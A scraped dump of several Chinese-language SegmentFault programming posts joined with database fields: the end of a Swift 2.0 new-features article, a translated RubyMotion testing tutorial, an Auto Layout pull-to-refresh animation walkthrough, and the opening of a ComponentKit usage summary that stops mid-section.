checkup([""id"": ""123456"", ""examNumber"": ""654321""]) // 您的身份证号为:123456，准考证号为:654321。请进入考场!

</code></pre>

<p>上述代码中的第一个<code>guard</code>语句用于检查身份证，如果检查到身份证没带，也就是表达式为<code>false</code>时，执行大括号里的代码，并返回。第二个<code>guard</code>语句则检查准考证。</p>

<p>如果两证齐全，则执行最后一个打印语句，上面的两个<code>guard</code>语句大括号内的代码都不会执行，因为他们表达式的布尔值都是<code>true</code>。</p>

<p>这里值得注意的是，<code>id</code>和<code>examNumber</code>可以在<code>guard</code>语句之外使用，也就是说当<code>guard</code>对其表达式进行验证后，<code>id</code>和<code>examNumber</code>可在整个方法的作用域中使用，并且是解包后的。</p>

<p>我们再用<code>if else</code>语句写一个类似的方法：</p>

<pre><code><br>func checkupUseIf(person: [String: String!]) {

    if let id = person[""id""], let examNumber = person[""examNumber""] {
        print(""您的身份证号为:\(id)，准考证号为:\(examNumber)。请进入考场！"")
    } else {
        print(""证件不齐全，不能进入考场!"")
    }

    print(""您的身份证号为:\(id)，准考证号为:\(examNumber)"")

}

checkupUseIf([""id"": ""123456""]) // 证件不齐全，不能进入考场!
checkupUseIf([""examNumber"": ""654321""]) // 证件不齐全，不能进入考场!
checkupUseIf([""id"": ""123456"", ""examNumber"": ""654321""]) // 您的身份证号为:123456，准考证号为:654321。请进入考场!

</code></pre>

<p>我们可以看到用<code>if else</code>实现的方法显然不如<code>guard</code>实现的那么精准。而且<code>id</code>和<code>examNumber</code>的作用域只限在<code>if</code>的第一个大括号内，超出这个作用域编译就会报错。</p>

<p>通过上述两个小例子不难看出，<code>guard</code>语句正如一个称职的守卫，层层把关，严防一切不允许发生的事，并且让代码具有更高的可读性，非常棒。</p>

<h2>异常处理</h2>

<p>在Swift 1.0时代是没有异常处理和抛出机制的，如果要处理异常，要么使用<code>if else</code>语句或<code>switch</code>语句判断处理，要么使用闭包形式的回调函数处理，再要么就使用<code>NSError</code>处理。以上这些方法都不能像Java中的<code>try catch</code>异常控制语句那样行如流水、从容不迫的处理异常，而且也会降低代码的可读性。当Swift 2.0到来后，一切都不一样了。</p>

<p>在Swift 2.0中Apple提供了使用<code>throws</code>、<code>throw</code>、<code>try</code>、<code>do</code>、<code>catch</code>这五个关键字组成的异常控制处理机制。下面我们来举例看看如何使用，我用使用手机刷朋友圈为例。</p>

<p>首先我们需要定义异常枚举，在Swift 2.0中Apple提供了<code>ErrorType</code>协议需要我们自定义的异常枚举遵循：</p>

<pre><code><br>enum WechatError: ErrorType {
    case NoBattery // 手机没电
    case NoNetwork // 手机没网
    case NoDataStream // 手机没有流量
}

</code></pre>

<p>我们定义了导致不能刷微信的错误枚举<code>’wechatError</code>。然后定义一个检查是否可以刷微信的方法<code>checkIsWechatOk()</code>：</p>

<pre><code><br>func checkIsWechatOk(isPhoneHasBattery: Bool, isPhoneHasNetwork: Bool, dataStream: Int) throws {

    guard isPhoneHasBattery else {
        throw WechatError.NoBattery
    }

    guard isPhoneHasNetwork else {
        throw WechatError.NoNetwork
    }

    guard dataStream &gt; 50 else {
        throw WechatError.NoDataStream
    }

}

</code></pre>

<p>这里注意，在方法名后有<code>throws</code>关键字，意思为该方法产生的异常向上层抛出。在方法体内使用<code>guard</code>语句对各种状态进行判断，然后使用<code>throw</code>关键字抛出对应的异常。然后我们定义刷微信的方法：</p>

<pre><code><br>func playWechat(isPhoneHasBattery: Bool, isPhoneHasNetwork: Bool, dataStream: Int) {

    do {
        try checkIsWechatOk(isPhoneHasBattery, isPhoneHasNetwork: isPhoneHasNetwork, dataStream: dataStream)
        print(""放心刷，刷到天昏地暗！"")
    } catch WechatError.NoBattery {
        print(""手机都没电，刷个鬼啊！"")
    } catch WechatError.NoNetwork {
        print(""没有网络哎，洗洗玩单机吧！"")
    } catch WechatError.NoDataStream {
        print(""没有流量了，去蹭Wifi吧！"")
    } catch {
        print(""见鬼了！"")
    }

}

playWechat(true, isPhoneHasNetwork: true, dataStream: 60) // 放心刷，刷到天昏地暗！
playWechat(true, isPhoneHasNetwork: false, dataStream: 60) // 没有网络哎，洗洗玩单机吧！
playWechat(false, isPhoneHasNetwork: true, dataStream: 60) // 手机都没电，刷个鬼啊！
playWechat(true, isPhoneHasNetwork: true, dataStream: 30) // 没有流量了，去蹭Wifi吧！

</code></pre>

<p>上述的代码示例中，首先检查是否可以刷微信的方法前使用<code>try</code>关键字，表示允许该方法抛出异常，然后使用了<code>do catch</code>控制语句捕获抛出的异常，进而做相关的逻辑处理。</p>

<p>这套异常处理机制使Swift更加的全面和安全，并且提高了代码的可读性，非常棒。</p>

<h2>协议扩展</h2>

<p>在Swift 1.0 时代，协议（<code>Protocol</code>）基本上类似一个接口，定义若干属性和方法，供类、结构体、枚举遵循和实现。在Swift 2.0中，可以对协议进行属性或者方法的扩展，和扩展类与结构体类似。这让我们开启了面向协议编程的篇章。</p>

<p>Swift中，大多数基础对象都遵循了<code>CustomStringConvertible</code>协议，比如<code>Array</code>、<code>Dictionary</code>（Swift 1.0中的<code>Printable</code>协议），该协议定义了<code>description</code>方法，用于<code>print</code>方法打印对象。现在我们对该协议扩展一个方法，让其打印出大写的内容:</p>

<pre><code><br>var arr = [""hello"", ""world""]
print(arr.description) // ""[hello, world]""

extension CustomStringConvertible {
    var upperDescription: String {
        return ""\(self.description.uppercaseString)""
    }
}

print(arr.upperDescription) // ""[HELLO, WORLD]""

</code></pre>

<p>如果在Swfit 1.0时代，要想达到上述示例的效果，那么我们需要分别对<code>Array</code>、<code>Dictionary</code>进行扩展，所以协议的扩展极大的提高了我们的编程效率，也同样使代码更简洁和易读。</p>

<h2>打印语句的改变</h2>

<p>在Swift1中，有'println()'和'print()'两个在控制台打印语句的方法，前者是换行打印，后者是连行打印。在Swift2中，'println()'已成为过去，取而代之的是他俩的结合体。如果你想做换行打印，现在需要这样写：</p>

<pre><code><br>print(""我要换行！"", appendNewline: true)

</code></pre>

<h2>
<code>available</code>检查</h2>

<p>作为iOS开发者，谁都希望使用最新版本iOS的Api进行开发，省事省力。但常常事与愿违，因为我们经常需要适配老版本的iOS，这就会面临一个问题，一些新特性特性或一些类无法在老版本的iOS中使用，所以在编码过程中经常会对iOS的版本做以判断，就像这样：</p>

<pre><code><br>if NSClassFromString(""NSURLQueryItem"") != nil {
    // iOS 8或更高版本
} else{
    // iOS8之前的版本
}

</code></pre>

<p>以上这只是一种方式，在Swift 2.0之前也没有一个标准的模式或机制帮助开发者判断iOS版本，而且容易出现疏漏。在Swift 2.0到来后，我们有了标准的方式来做这个工作：</p>

<pre><code><br>if #available(iOS 8, *) {
    // iOS 8或更高版本
    let queryItem = NSURLQueryItem()
    
} else {
    // iOS8之前的版本
    
}

</code></pre>

<p>这个特性让我们太幸福。</p>

<h2>
<code>do-while</code>语句重命名</h2>

<p>经典的<code>do-while</code>语句改名了，改为了<code>repeat-while</code>：</p>

<pre><code><br>var i = 0
repeat {
    i++
    print(i)
} while i &lt; 10

</code></pre>

<p>个人感觉更加直观了。</p>

<h2>
<code>defer</code>关键字</h2>

<p>在一些语言中，有<code>try/finally</code>这样的控制语句，比如Java。这种语句可以让我们在<code>finally</code>代码块中执行必须要执行的代码，不管之前怎样的兴风作浪。在Swift 2.0中，Apple提供了<code>defer</code>关键字，让我们可以实现同样的效果。</p>

<pre><code><br>func checkSomething() {

    print(""CheckPoint 1"")
    doSomething()
    print(""CheckPoint 4"")

}

func doSomething() {

    print(""CheckPoint 2"")
    defer {
        print(""Clean up here"")
    }
    print(""CheckPoint 3"")

}

checkSomething() // CheckPoint 1, CheckPoint 2, CheckPoint 3, Clean up here, CheckPoint 4

</code></pre>

<p>上述示例可以看到，在打印出“CheckPoint 2”之后并没有打印出“Clean up here”，而是“CheckPoint 3”，这就是<code>defer</code>的作用，它对进行了<code>print(""Clean up here"")</code>延迟。我们再来看一个I/O的示例：</p>

<pre><code><br>// 伪代码
func writeSomething() {

    let file = OpenFile()

    let ioStatus = fetchIOStatus()
    guard ioStatus != ""error"" else {
        return
    }
    file.write()

    closeFile(file)

}

</code></pre>

<p>上述示例是一个I/O操作的伪代码，如果获取到的<code>ioStatus</code>正常，那么该方法没有问题，如果<code>ioStatus</code>取到的是<code>error</code>，那么会被<code>guard</code>语句抓到执行<code>return</code>操作，这样的话<code>closeFile(file)</code>就永远都不会执行了，一个严重的Bug就这样产生了。下面我们看看如何用<code>defer</code>来解决这个问题：</p>

<pre><code><br>// 伪代码
func writeSomething() {

    let file = OpenFile()
    defer {
        closeFile(file)
    }

    let ioStatus = fetchIOStatus()
    guard ioStatus != ""error"" else {
        return
    }
    file.write()

}

</code></pre>

<p>我们将<code>closeFile(file)</code>放在<code>defer</code>代码块里，这样即使<code>ioStatus</code>为<code>error</code>，在执行<code>return</code>前会先执行<code>defer</code>里的代码，这样就保证了不管发生什么，最后都会将文件关闭。</p>

<p><code>defer</code>又一个保证我们代码健壮性的特性，我非常喜欢。</p>

<p>Swift 2.0中的新特性当然不止以上这些，但窥一斑可见全豹，Swift 2.0努力将更快、更安全做到极致，这是开发人员的福音，让我们尽情享受这门美妙的语言吧。</p>

<p>本文首发地址：<a rel=""nofollow"" href=""http://www.devtalking.com/articles/what-is-new-in-swift/"">Swift 2.0初探</a></p>

                ", Swift 2.0初探,1531972110,168,1,502,1,1,https://segmentfault.com/a/1190000002922232
149,1,0,6,"
                    
<p>翻译：<a rel=""nofollow"">@shiweifu</a><br>
本文链接：<a rel=""nofollow"" href=""http://segmentfault.com/blog/shiweifu""></a><a rel=""nofollow"" href=""http://segmentfault.com/blog/shiweifu"">http://segmentfault.com/blog/shiweifu</a><br>
原文链接：<a rel=""nofollow"" href=""http://rubymotion-tutorial.com/8-testing/""></a><a rel=""nofollow"" href=""http://rubymotion-tutorial.com/8-testing/"">http://rubymotion-tutorial.com/8-testing/</a><br>
目标读者：[""想了解RubyMotion开发模式"", ""想学习RubyMotion"", ""对移动端测试感兴趣""]<br>
翻译者按：测试是移动开发的一个痛点。这篇文章讲述了使用RubyMotion如何进行有效的测试，可以看出相对于原生开发环境的测试，简化很多。这部分也是RubyMoiton的一大特色。</p>

<hr>
<p>除了语法不同，你可能觉得 RubyMotion 不过是提供了一条使用 Ruby 语法来编写 Cocoa 程序的方式。和使用 Objective-C 来实现同样的功能相比，并无特殊之处。本章将介绍 RubyMotion 中独有的特性。</p>

<p>自动化测试是屌炸天的事儿。屌在哪？它能使你的程序更加健壮，通过一些测试代码，能让你及时发现问题所在，是不是很棒？</p>

<p>是的，大家都认为测试是个好东西，但事实上大多数工程师并不能坚持写测试。它不能让你有足够的成就感，不是能和其他人吹嘘的牛逼特性或者性能提升。但它是一种保障，特别是项目经常改变，它能让你知道你的代码究竟可不可用。</p>

<p>接下来我们将了解 RubyMotion 中的测试，简单编写，覆盖度高。</p>

<p>在 Ruby 社区，大家都很重视测试，Ruby 的测试相对 iOS App，也相对简洁。如果要在iOS 中实现自动化测试，往往需要借助第三方库或者使用JavaScript。RubyMotion 的测试库要好用的多。</p>

<p>到底有多屌？</p>

<h3>Unit Testing</h3>

<p>使用 <code>motion create Tests</code> 命令新建一个项目然后<code>cd</code>进去。我们讨论里面的<code>spec</code>文件夹。</p>

<p>这个文件夹里有一个名为<code>./spec/main_spec.rb</code>的文件，这是创建项目的时候自动生成的。在 RubyMotion 的测试工作的时候，它会加载这个文件夹里面的<code>*.rb</code>文件。我们来看下这个文件的内容：</p>

<pre><code>describe ""Application 'Tests'"" do
  before do
    @app = UIApplication.sharedApplication
  end

  it ""has one window"" do
    @app.windows.size.should == 1
  end
end
</code></pre>

<p>可以看到一个简单的表达式：<code>@app.windows.size.should == 1</code>，它的意思看起来是如果<code>.size</code>不为1，就测试失败。</p>

<p><code>.should</code> 支持以下的判断类型：</p>

<pre><code>@app.nil?.should == false

[1,2,3].should.not == [1,2,3,4]

@model.id.should == example_id
</code></pre>

<p><code>describe</code> 和 <code>it</code> 组成了一个用来实现测试的结构。在上面的这个<code>describe</code>结构中，传达了两个意思：<code>""[Test that] Application""</code>，被测试对象有一<code>Window</code>。一个<code>describe</code>结构中可以包含多个<code>it</code>，<code>it</code>中又可以包含多个测试断言。你如果喜欢的话，也可以写多个<code>describe</code>。</p>

<p>每一个将被测试的内容都会先执行<code>before</code>中的内容。应该把一些初始化的代码丢到这里。</p>

<p>接下来在终端中，运行<code>rake spec</code>，看看测试的结果。</p>

<p><span class=""img-wrap""><img data-src=""http://rubymotion-tutorial.com/8-testing/images/1.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image""></span></p>

<p>还是挂了……提示说没有找到window。让我们在<code>AppDelegate</code>中修复：</p>

<pre><code>class AppDelegate
  def application(application, didFinishLaunchingWithOptions:launchOptions)
    @window = UIWindow.alloc.initWithFrame(UIScreen.mainScreen.applicationFrame)
    @window.makeKeyAndVisible
    true
  end
end
</code></pre>

<p>再执行一次<code>rake spec</code>，这次正确了：</p>

<p><span class=""img-wrap""><img data-src=""http://rubymotion-tutorial.com/8-testing/images/2.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""image""></span></p>

<p>咦，似乎已经通过自动化测试解决了一个Bug，但愿是真的解决了吧。</p>

<p>我们已经看到了如何去检查一个对象的属性，这很有用但还不够。有时候我们会触发事件，比如我们敲击了一个按钮，它调用了一个内部方法，这种情况下，我们要测试需要去手动调用这个方法，然后进行测试……事实上有更好的做法。</p>

<h3>Funcational Testing</h3>

<p>RubyMotion 对 <code>Funcational Testing</code> 有着很好的支持，比如你想测试触发 UI 事件，如<code>Tap</code>、<code>Swipe</code> 然后检查它的结果，你不用去<code>button.callback.call</code>，你可以用等效的方法：<code>tap button</code>，测试用例很整洁，对不对？</p>

<p><code>Funcational Testing</code>虽然屌屌的，但它的局限是它只能测试一个<code>UIViewController</code>。所以像<code>push</code>和<code>pop</code>这种就无能为力了。需要注意。</p>

<p>要接着跑通这个例子，我们需要一个<code>UIViewController</code>的子类，创建<code>./app/ButtonController.rb</code>，然后增加一个按钮和回调事件。代码如下：</p>

<pre><code>class ButtonController &lt; UIViewController
  def viewDidLoad
    super

    @button = UIButton.buttonWithType(UIButtonTypeRoundedRect)
    @button.setTitle(""Test me title!"", forState:UIControlStateNormal)
    @button.accessibilityLabel = ""Test me!""
    @button.sizeToFit
    @button.frame = CGRect.new([10, 70], @button.frame.size)
    self.view.addSubview(@button)

    @button.addTarget(self, action:'tapped', forControlEvents:UIControlEventTouchUpInside)
  end

  def tapped
    p ""I'm tapped!""
    @was_tapped = true
  end
end
</code></pre>

<p>标准的代码，除了<code>accessibilityLabel</code>。这是每个<code>View</code>都包含的一个<code>String</code>类型属性。当使用VoiceOver功能的时候，系统依赖这个属性（所以别随便设置这个属性的值）。为啥我们会提到这一点？因为 RubyMotion 的<code>Funcational Testing</code>就依赖这个属性。所以确保要测试的View已经设置好这个属性。</p>

<p>最后，我们把<code>Controller</code>和<code>AppDelegate</code>关联起来：</p>

<pre><code>def application(application, didFinishLaunchingWithOptions:launchOptions)
  @window = UIWindow.alloc.initWithFrame(UIScreen.mainScreen.applicationFrame)
  @window.makeKeyAndVisible

  @view_controller = ButtonController.alloc.initWithNibName(nil, bundle:nil)
  @window.rootViewController = @view_controller

  true
end
</code></pre>

<p>你可以使用<code>rake</code>执行一下，看看在你触发按钮事件的时候终端有没有输出<code>I'm tapped!</code>。接下来我们写测试代码，看看变量是否真的被赋值。</p>

<p>在<code>main_spec.rb</code>，添加<code>describe</code>块及代码：</p>

<pre><code>describe ""button controller"" do
  tests ButtonController

  it ""changes instance variable when button is tapped"" do
    tap 'Test me!'
    controller.instance_variable_get(""@was_tapped"").should == true
  end
end
</code></pre>

<p>让我们来看看有啥新东西。</p>

<p><code>tests &lt;class&gt;</code>连接我们的<code>describe</code>，指定<code>UIViewController</code>。它的行为很清晰：将要测试的<code>UIViewController</code>放在了一个新的<code>UIWindow</code>中。我们能使用<code>self.window</code>和<code>self.controller</code>访问其。这样做也确保了被测试的<code>Controller</code>不会被干扰。</p>

<p><code>tap</code>可以替换成<code>flick</code>、<code>drag</code>、<code>pinch_close</code>、<code>pinch_open</code>和<code>rotate</code>对应相应的行为。查看RubyMotion's <a rel=""nofollow"" href=""http://www.rubymotion.com/developer-center/articles/testing/#_view_events"">full documentation</a>具体的细节。</p>

<p><code>rake spec</code>，它已经能正常工作啦：</p>

<pre><code>2 specifications (2 requirements), 0 failures, 0 errors
</code></pre>

<h3>总结</h3>

<p>我们看到了在RubyMotion中编写测试是多么的简单。如果你之前因为繁琐不写测试，现在没理由懒惰了。</p>

<p>我们学到了啥？</p>

<ul>
<li>RubyMotion加载测试用例从<code>./spec</code>目录。</li>
<li>测试用例包含在<code>describe</code>和<code>it</code>中，后面跟随着标签，用来标识和组织。</li>
<li>使用 <code>&lt;any object&gt;.should</code> 进行断言。例：<code>greeting.should == ""hello""</code>。</li>
<li>
<code>UIViewControllers</code>可以进行funcational。 tests，可以模拟一些像<code>tap</code>、<code>pinch</code>触发事件。在你的<code>describe</code>代码块中，使用<code>tests &lt;controller class&gt;</code>去使用这些特性。</li>
<li>
<code>tap &lt;accessibility label&gt;</code>是访问View的<code>accessibilityLabel</code>属性。</li>
</ul>

                ", RubyMotion 指南：测试,1531972112,440,1,583,1,1,https://segmentfault.com/a/1190000002880013
150,1,0,6,"
                    
<hr>
<p>原文发表在我的个人网站：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/450.html"">Auto Layout 使用心得（六）—— 制造炫酷的下拉刷新动画</a></p>

<hr>
<blockquote>
  <p>此系列文章代码仓库在 <a rel=""nofollow"" href=""https://github.com/johnlui/AutoLayout"">https://github.com/johnlui/AutoLayout</a> ，有不明白的地方可以参考我的 Auto Layout 设置哦，下载到本地打开就可以了。</p>
</blockquote>

<h2>简介</h2>

<p>本文中，我们将一起使用 Auto Layout 技术制造一个炫酷的下拉刷新动画。Auto Layout 除了在布局的时候比较繁琐以外，还有一个经常被人吐槽的点：让许多 UIView.animateWithDuration 失效，甚至在界面上出现 “反方向动画” 的视觉效果。本文中我们将主要讲述制造下拉刷新动画的过程，关于 Auto Layout 与动画的详细配合我们以后再一起仔细探究。</p>

<h2>实现首页整体下拉回弹效果</h2>

<h3>建立接受下拉事件的主 View</h3>

<p>使用一个跟窗体一样很大的 mainView 把目前首页的五个元素包括，并补全 Auto Layout 布局。层次结构改变会让除尺寸约束之外的所有约束消失。</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/7cfc1430051566.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>修改 UI 绑定及动画函数</h3>

<p>UI 和代码的绑定修改成如下：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/2c091430051565.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>重新给 mainView 绑定上 panGesture，从 mainView 向 panGesture 拖动：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/6c011430051565.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>修改存储值的变量名称和初始化代码：</p>

<pre><code>swift</code><code>...
var mainViewTopSpaceLayoutConstraintValue: CGFloat!
var mainViewOriginY: CGFloat!

...

mainViewTopSpaceLayoutConstraintValue = topLayoutConstraintOfMainView.constant
mainViewOriginY = mainView.frame.origin.y

...
</code></pre>

<p>修改手势触发的目标函数（增加冒号）：</p>

<pre><code>swift</code><code>panGesture.addTarget(self, action: Selector(""pan:""))
</code></pre>

<p>改写动画目标函数：</p>

<pre><code>swift</code><code>func pan(recongnizer: UIPanGestureRecognizer) {
    if panGesture.state == UIGestureRecognizerState.Ended {
        UIView.animateWithDuration(0.4, delay: 0, options: UIViewAnimationOptions.CurveEaseInOut, animations: { () -&gt; Void in
            recongnizer.view?.frame.origin.y = self.mainViewOriginY
            }, completion: { (success) -&gt; Void in
                if success {
                    self.topLayoutConstraintOfMainView.constant = self.mainViewTopSpaceLayoutConstraintValue
                }
        })
        return
    }
    let y = panGesture.translationInView(self.view).y
    topLayoutConstraintOfMainView.constant = mainViewTopSpaceLayoutConstraintValue + y
}
</code></pre>

<h3>查看新的拖动回弹效果</h3>

<p><span class=""img-wrap""><img data-src=""http://staticonsae.sinaapp.com/images/7.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>建立动画视图</h2>

<h3>建立动画主视图</h3>

<p>拖动一个 View 到 mainView 上面，目的是置于 mainView 图层之下。在 Xcode 里，最上面的元素位于 UI 的最底层，这个顺序跟 PS 正好相反。修改其 frame，添加 Auto Layout 约束，如下图：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/f5ab1430051564.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>将 UI 和代码绑定：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/ed351430051562.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>动画的时候我们需要该主视图进行一定程度的下移，故将其 “到父视图顶部的距离” 的约束也进行绑定。（此图为后期补充，请自动忽略其子元素）</p>

<h3>填充动画元素</h3>

<p>将动画主视图改名为 HiddenTopView。为了方便的填充动画元素，需要先将 HiddenTopView 移动到 mainView 之下，以便将图层显示在 mainView 之上，不被其遮挡，无法编辑。我填充了三个图片资源，全部加上约束。具体约束大家可以自由发挥。效果如下：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/abfd1430051564.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>由于我使用了白云元素，故将最大的 view 的背景色填充为灰色，将 HiddenTopView 背景色设置为透明。</p>

<h3>查看布局效果</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/08911430051563.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>动画规划</h2>

<p>我们计划整个下拉刷新动画分为四个部分。下拉时：</p>

<ol>
<li>整个 HiddenTopView 下移</li>
<li>小云彩从屏幕右侧飞入</li>
<li>大云彩持续做往复运动</li>
<li>下拉距离超过一定值时，中间子元素进行一定程度的放大</li>
</ol>
<h2>完善准备工作</h2>

<h3>分析需要获取的约束</h3>

<p>“动画规划”中，1 上面已经准备过，2、3 需要将小云、大云的横向定位参数向代码绑定，4 只需绑定中间元素即可。</p>

<h3>绑定三个子元素及其关键约束到代码</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/35671430051563.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>Make them move!</h2>

<p>由于事先动画效果的代码描述起来过于麻烦，请直接看代码：<a rel=""nofollow"" href=""https://github.com/johnlui/AutoLayout/blob/1420fddee57d22ebd443656fb3158c7dede84b56/AutoLayout/ViewController.swift"">https://github.com/johnlui/AutoLayout/blob/1420fddee57d22ebd443656fb31...</a></p>

<h2>查看效果</h2>

<p><span class=""img-wrap""><img data-src=""http://staticonsae.sinaapp.com/images/8.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

                ", Auto Layout 使用心得（六）—— 制造炫酷的下拉刷新动画,1531972113,560,1,1000,1,1,https://segmentfault.com/a/1190000002709470
151,1,0,6,"
                    
<h2>前言的前言</h2>

<p>好。。开始做下ComponentKit使用总结。。源码没有看，只看了一些概念以及API。本篇文章主要总结下使用心得以及ComponentKit的理念。一切的分析都基于使用层面上的。。大神请打脸或略过~</p>

<p><em>本文面向有一定开发经验的iOSer，以及喜欢折腾的iOSer...</em></p>

<h2>前言</h2>

<p>传统MVC模式，数据(s)-控制器(s)-视图(s)之间的双向流所产生的大量状态将导致：<br>
1）代码激增<br>
2）BUG出现得概率增大<br>
3）视图渲染效率低<br>
4）APP流畅度不高（特指ScrollView不能达到60FPS）<br>
所以我们需要一个更为简单粗暴的框架来写我们的APP。。（真正的原因，绝不会告诉你其实只是被要求...）</p>

<h2>理念</h2>

<p>既然名字叫做<code>ComponentKit</code>，自然先说说<code>Component（元素）</code>。对于开发者来说，所有的图层（可见/不可见）其实都是由一个元素排版而来。不同的元素根据不同的排版展示出不同的视图。我做个类比：<em>正如中国四大发明之一-<a rel=""nofollow"" href=""https://www.youtube.com/watch?v=XhXC4SKOGfQ&amp;t=24m40s"">活字印刷</a>一样通过改变排版可以展示不同的文字内容。</em><br>
这里引用文档的一句话：</p>

<blockquote>
  <p>A simple analogy is to think of a component as a stencil: a fixed description that can be used to paint a view but that is not a view itself.</p>
</blockquote>

<p>意思也大概如此Component不并不直接当做视图（印刷出来的东西）展示，而是告诉你视图长什么样（印刷模具的存在）~</p>

<h2>特性</h2>

<p><strong>三大特性：</strong>（不明觉厉的地方）</p>

<ul>
<li>描述性：通过<code>stack</code>为主(这里我翻译成“（纵向或者横向）堆砌”)排版模具来告诉我们某一个元素A的子元素在A中如何排列。</li>
<li>函数式：保证数据流是单向的，也就是数据决定Component。比如方程“1 + X”，如果X=2或者X=3相对应结果“1 + 2”与“1 + 3”是固定的一样。数据如果确定了，那么结果就是不变的。当数据发生改变的时候，对应的component会进行重新渲染。（这里FB宣称该框架会尽量少的重新渲染，没有读过代码，没有发言权）</li>
<li>可组合：这里可以想下积木，有些部分写成component，其他地方可以重用。</li>
</ul>
<p>个人使用的心得？：数据单向流，好处无非在于什么样的数据决定什么样的视图，我们可以无视很多各种交互产生的状态，而仅仅只需要把精力放在数据层上，写好排版方程（functional）似乎好像可以做到一劳永逸。但是正因为如此，ComponentKit在写动画的时候注定较麻烦，因为数据变化是连续的~~也就是model是不断变化的。使用上可以做一些取舍。用ComponentKit的好处就在于写代码可以处于无脑状态，抓着绳子（数据）的一端就好，不容易打死结~</p>

<p>至于动画方面的解释，FB如是说：</p>

<blockquote>
  <p>Dynamic gesture-driven UIs are currently hard to implement in ComponentKit; consider using AsyncDisplayKit.</p>
</blockquote>

<h2>API （官方文档内容）</h2>

<h3><code>CKComponent</code></h3>

<p>上面说了Component是不可变的，且其可以在任何线程进行创建，避免了出现在主线程的竞争。</p>

<p>这里主要是两个API：</p>

<pre><code>/** Returns a new component. */
+ (instancetype)newWithView:(const CKComponentViewConfiguration &amp;)view
                       size:(const CKComponentSize &amp;)size;

/** Returns a layout for the component and its children. */
- (CKComponentLayout)layoutThatFits:(CKSizeRange)constrainedSize
                         parentSize:(CGSize)parentSize;
</code></pre>

<p>一个用来创建Component，一个用来进行排版。</p>

<h3><code>Composite Components</code></h3>

<p>这里只有一句话重点：任何情况自定义component下不要继承<code>CKComponent</code>，而是继承<code>Composite Components</code>。<br>
大概原因就是不要污染清纯的父类Component，不要因为一个简单得需求而直接进行继承并重写父类方法（很多弊端，FB blabla），而应该采用修饰的手段来达成（<a rel=""nofollow"" href=""http://www.objc.io/issue-22/facebook.html"">装饰设计</a>模式？）。</p>

<p>这里给出坏代码以及推荐代码示例：</p>

<pre><code>// 不推荐的坏代码：
@implementation HighlightedCardComponent : CardComponent
- (UIColor *)backgroundColor
{
  // This breaks silently if the superclass method is renamed.
  return [UIColor yellowColor];
}
@end
// 推荐代码：
@implementation HighlightedCardComponent : CKCompositeComponent
+ (instancetype)newWithArticle:(CKArticle *)article
{
  return [super newWithComponent:
          [CardComponent
           newWithArticle:article
           backgroundColor:[UIColor yellowColor]]];
}
@end
</code></pre>

<h3>Views</h3>

<p>创建一个元素的类方法</p>

<pre><code>+ (instancetype)newWithView:(const CKComponentViewConfiguration &amp;)view
                       size:(const CKComponentSize &amp;)size;
</code></pre>

<p>这里说下第一个参数告诉CK用什么图层类，第二个参数告诉CK如何配置这个图层类。<br>
举个栗子</p>

<pre><code>[CKComponent 
 newWithView:{
   [UIImageView class],
   {
     {@selector(setImage:), image},
     {@selector(setContentMode:), @(UIViewContentModeCenter)} // Wrapping into an NSNumber
   }
 }
 size:{image.size.width, image.size.height}];
</code></pre>

<p>同样可以设置空值，举个栗子：</p>

<pre><code>[CKComponent newWithView:{} size:{}]
// 更为直接
[CKComponent new]
</code></pre>

<h3>Layout &amp;&amp; Layout Components</h3>

<p>与UIView中的<code>layoutSubViews</code>对应的是CK中的<br><code>layoutThatFits:</code>。</p>

<p>这里主要介绍几个常用的<code>Layout Components</code></p>

<ul>
<li>
<code>CKStackLayoutComponent</code> 横向或者纵向堆砌子元素</li>
<li>
<code>CKInsetComponent</code>内陷与大苹果内陷相似</li>
<li>
<code>CKBackgroundLayoutComponent</code> 扩展底部的元素作为背景</li>
<li>
<code>CKOverlayLayoutComponent</code> 扩展覆盖层的元素作为遮罩</li>
<li>
<code>CKCenterLayoutComponent</code> 在空间内居中排列</li>
<li>
<code>CKRatioLayoutComponent</code> 有比例关系的元素</li>
<li>
<code>CKStaticLayoutComponent</code> 可指定子元素偏移量</li>
</ul>
<h3>响应者链 &amp;&amp; Tap事件 &amp;&amp; 手势支持</h3>

<h4>响应者链</h4>

<p>FB中的响应者链与苹果类似，但是两者是分离的。<br>
FB中的链大概长相：<br>
儿子component-&gt; 儿子componentController(如果有) -&gt; 父亲component-&gt; 父亲componentController(如果有) -&gt; (...递归 blabla) -&gt; 【通过<code>CKComponentActionSend</code>桥接】-&gt; (过程：找到被附着的那个View，通过这个View找到最底层的叶子节点ViewA -&gt; (往上遍历ViewA的父亲ViewB -&gt; (...递归 blabla)。</p>

